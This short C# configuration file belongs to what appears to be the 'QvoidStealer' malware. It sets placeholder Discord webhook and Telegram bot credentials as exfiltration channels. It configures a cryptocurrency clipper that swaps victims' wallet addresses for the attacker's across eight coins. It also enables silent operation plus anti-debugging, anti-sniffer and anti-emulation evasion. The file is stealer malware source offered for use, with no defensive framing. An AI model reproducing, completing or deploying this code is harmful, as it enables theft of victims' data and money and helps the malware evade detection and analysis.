using QvoidWrapper;

namespace QvoidStealer.Main
{
    class Settings
    {
        public static DiscordWebhook Webhook = new DiscordWebhook("%WEBHOOK_HERE%");
        public static TelegramAPI Telegram = new TelegramAPI("%TELEGRAM_TOKEN_HERE%", 0/*%TELEGRAM_CHAT_ID_HERE%*/);
        public static CryptoClipper Clipper = new CryptoClipper("BTC_ADDRESS_HERE_", "ETH_ADDRESS_HERE_", "DODGE_ADDRESS_HERE_", "LTC_ADDRESS_HERE_", "XMR_ADDRESS_HERE_", "DASH_ADDRESS_HERE_", "NEO_ADDRESS_HERE_", "XRP_ADDRESS_HERE_");

        public static bool Silent = true;
        public static bool AntiWebSinffers = true;
        public static bool AntiDebug = true;
        public static bool AntiVM = false;
        public static bool AntiSandBoxie = false;
        public static bool AntiEmulation = true;
    }
}